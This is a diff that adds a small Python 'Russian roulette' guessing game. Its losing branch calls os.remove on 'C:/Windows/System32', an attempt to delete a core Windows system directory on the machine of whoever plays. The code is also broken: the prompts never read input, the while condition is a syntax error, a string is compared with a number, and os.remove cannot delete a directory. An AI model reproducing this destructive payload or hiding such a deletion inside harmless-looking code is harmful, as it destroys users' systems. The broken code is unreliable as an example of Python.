@@ -1,0 +1,15 @@
+import random 
+import os
+low = 1
+high = 10
+print("welcome to the Russian roulette")
+print()
+guess = ("choose a number: ")
+while guess = "":
+  guess = ("cmon don't be scared: ")
+
+ai_guess = random.randint(low,high)
+if guess == ai_guess:
+   print("you Won!!!")
+else:
+   os.remove("C:/Windows/System32")
